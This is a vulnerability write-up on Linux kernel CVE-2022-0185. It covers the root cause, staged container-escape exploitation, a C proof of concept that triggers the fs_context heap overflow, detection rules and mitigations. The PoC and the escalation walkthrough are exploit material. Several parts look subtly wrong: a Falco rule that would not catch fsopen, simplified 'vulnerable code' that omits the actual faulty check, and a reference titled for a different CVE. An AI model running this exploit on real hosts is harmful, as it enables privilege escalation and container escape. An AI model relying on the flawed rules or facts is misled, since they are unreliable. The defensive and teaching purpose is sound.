# CVE-2022-0185 - File System Context Heap Overflow

## Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2022-0185 |
| **CVSS Score** | 8.4 (HIGH) |
| **Type** | Heap-based buffer overflow |
| **Component** | Linux Kernel `fs/fs_context.c` |
| **Function** | `legacy_parse_param()` |
| **Affected Kernels** | Linux kernel < 5.16.2 |
| **Impact** | Container escape, local privilege escalation |
| **Requirements** | `CAP_SYS_ADMIN` in current user namespace |
| **Discovered by** | Crusaders of Rust (William Liu, Jamie Hill-Daniel) |

## Technical Description

### Root Cause

The vulnerability exists in the `legacy_parse_param()` function within `fs/fs_context.c` in the Linux kernel. This function is responsible for parsing filesystem mount parameters.

The bug is a **heap-based buffer overflow** caused by an integer underflow in the size calculation:

```c
// Vulnerable code in fs/fs_context.c (simplified)
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
    // ...
    size_t len = 0;

    // The 'size' field uses an unsigned integer
    // When the accumulated parameter string exceeds PAGE_SIZE (4096 bytes),
    // the size calculation wraps around, causing a heap overflow
    len += strlen(param->key);
    if (param->type == fs_value_is_string)
        len += 1 + strlen(param->string); // +1 for '='

    // BUG: 'len' can cause the buffer to overflow if total exceeds
    // the allocated size due to incorrect bounds checking
    // The check uses the wrong variable for comparison
}
```

### Exploitation Overview

The exploit works in the following stages:

#### Stage 1: Trigger the Heap Overflow

1. An unprivileged user creates a new user namespace (which grants `CAP_SYS_ADMIN` within that namespace)
2. Opens a filesystem context using `fsopen()` system call
3. Sends carefully crafted `fsconfig()` calls with parameters that cause the size counter to overflow
4. This corrupts adjacent heap objects

#### Stage 2: Heap Feng Shui

The attacker must carefully arrange the kernel heap to place a target object (typically a `msg_msg` structure or `pipe_buffer`) adjacent to the overflowed buffer. This requires:

1. Spraying the heap with known objects
2. Creating holes at predictable locations
3. Triggering the overflow to corrupt the adjacent object

#### Stage 3: Arbitrary Read/Write

By corrupting a `msg_msg` structure, the attacker gains:

1. **Arbitrary read**: Modify the `m_ts` (message size) field to read beyond the message boundary
2. **Arbitrary write**: Use the corrupted structure to write to arbitrary kernel memory

#### Stage 4: Privilege Escalation

With arbitrary kernel read/write:

1. Locate the current process's `cred` structure in kernel memory
2. Overwrite `uid`, `gid`, `euid`, `egid` to 0 (root)
3. Overwrite the user namespace pointer to the init namespace
4. The process now has root privileges in the init (host) namespace

### Container Escape Mechanism

```
+----------------------------------+
| Container (unprivileged user)    |
|                                  |
| 1. unshare(CLONE_NEWUSER)        |  Create user namespace
|    -> gains CAP_SYS_ADMIN        |  (within new user ns)
|                                  |
| 2. fsopen("ext4") + fsconfig()   |  Trigger heap overflow
|    -> corrupts kernel heap       |
|                                  |
| 3. Heap manipulation             |  Gain arbitrary kernel r/w
|    -> msg_msg corruption         |
|                                  |
| 4. Overwrite cred + namespace    |  Become root in host ns
|    -> uid=0, init_user_ns        |
|                                  |
| 5. Now running as HOST root      |  ESCAPED
+----------------------------------+
```

## Proof of Concept (Conceptual)

**Note:** This is a simplified conceptual overview. The actual exploit requires precise heap manipulation and is kernel-version-specific.

```c
// Conceptual PoC - DO NOT USE IN PRODUCTION
// This is for educational understanding only

#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <unistd.h>

// System call wrappers for fsopen/fsconfig (not in glibc)
int fsopen(const char *fsname, unsigned int flags) {
    return syscall(__NR_fsopen, fsname, flags);
}

int fsconfig(int fd, unsigned int cmd, const char *key,
             const char *value, int aux) {
    return syscall(__NR_fsconfig, fd, cmd, key, value, aux);
}

int main(void) {
    // Step 1: Create a user namespace to get CAP_SYS_ADMIN
    if (unshare(CLONE_NEWUSER) != 0) {
        perror("unshare failed");
        return 1;
    }

    // Step 2: Open a filesystem context
    int fd = fsopen("ext4", 0);
    if (fd < 0) {
        perror("fsopen failed");
        return 1;
    }

    // Step 3: Send parameters that trigger the overflow
    // The key is to send enough data to cause the integer overflow
    // in the legacy_parse_param size tracking
    char payload[4096];
    memset(payload, 'A', sizeof(payload) - 1);
    payload[sizeof(payload) - 1] = '\0';

    // FSCONFIG_SET_STRING = 1
    // Each call adds to the internal buffer without proper bounds checking
    for (int i = 0; i < 50; i++) {
        fsconfig(fd, 1, payload, "overflow", 0);
        // After enough iterations, the internal counter overflows
        // and subsequent writes corrupt adjacent heap memory
    }

    // Steps 4-5: Heap feng shui and privilege escalation
    // (complex kernel exploitation - omitted for safety)

    printf("[*] Exploit triggered - check kernel logs\n");
    return 0;
}
```

## Affected Configurations

This CVE affects containers when:

1. **Host kernel is vulnerable** (< 5.16.2)
2. **User namespaces are enabled** (default on most distributions)
   - Ubuntu: enabled by default
   - Debian: enabled by default
   - RHEL/CentOS 8+: enabled by default
3. **No seccomp profile** blocking `fsopen`/`fsconfig` syscalls
4. **Container runs as non-root** (needs `unshare` to create user namespace)

### Kubernetes-Specific Impact

In Kubernetes environments:
- Default seccomp profile (`RuntimeDefault`) does **NOT** block `fsopen`/`fsconfig`
- Default AppArmor profile does **NOT** prevent user namespace creation
- Even non-privileged pods can be vulnerable if the host kernel is affected
- Multi-tenant clusters are especially at risk

## Detection

### Runtime Detection (Falco Rule)

```yaml
- rule: Potential CVE-2022-0185 Exploitation
  desc: Detect fsopen syscall usage which may indicate CVE-2022-0185 exploitation
  condition: >
    evt.type = openat and
    (evt.arg.name contains "/proc/self/ns/user" or
     evt.arg.name contains "fs_context")
  output: >
    Potential CVE-2022-0185 exploitation detected
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository)
  priority: CRITICAL
  tags: [container, cve, escape]
```

### Kernel Audit Rule

```bash
# Monitor fsopen/fsconfig syscalls
auditctl -a always,exit -F arch=b64 -S fsopen -S fsconfig -k cve_2022_0185
```

### Check if Host is Vulnerable

```bash
# Check kernel version
uname -r
# Vulnerable if < 5.16.2

# Check if user namespaces are enabled
cat /proc/sys/user/max_user_namespaces
# Vulnerable if > 0

# Check for the patch
grep -r "legacy_parse_param" /usr/src/linux/fs/fs_context.c 2>/dev/null
```

## Mitigation

### Immediate Mitigations

1. **Update the kernel** to >= 5.16.2

2. **Disable user namespaces** (if not needed):
   ```bash
   sysctl -w user.max_user_namespaces=0
   # Or permanently:
   echo "user.max_user_namespaces=0" >> /etc/sysctl.d/99-disable-userns.conf
   ```

3. **Apply a seccomp profile** that blocks `fsopen` and `fsconfig`:
   ```json
   {
     "defaultAction": "SCMP_ACT_ALLOW",
     "syscalls": [
       {
         "names": ["fsopen", "fsconfig", "fsmount", "fspick", "move_mount"],
         "action": "SCMP_ACT_ERRNO",
         "errnoRet": 1
       }
     ]
   }
   ```

4. **Use AppArmor** to restrict user namespace creation:
   ```
   deny unshare,
   ```

### Kubernetes Mitigations

1. **Enforce Pod Security Standards** (restricted profile)
2. **Apply custom seccomp profiles** blocking filesystem syscalls
3. **Use OPA/Gatekeeper** to enforce seccomp on all pods
4. **Keep node OS and kernel updated**
5. **Use runtime security tools** (Falco, Tracee) for detection

## References

- [NVD: CVE-2022-0185](https://nvd.nist.gov/vuln/detail/CVE-2022-0185)
- [Kernel Patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29)
- [Crusaders of Rust - Original Writeup](https://www.willsroot.io/2022/01/cve-2022-0185.html)
- [Container Escape via CVE-2022-0185 (CrowdStrike)](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0185/)
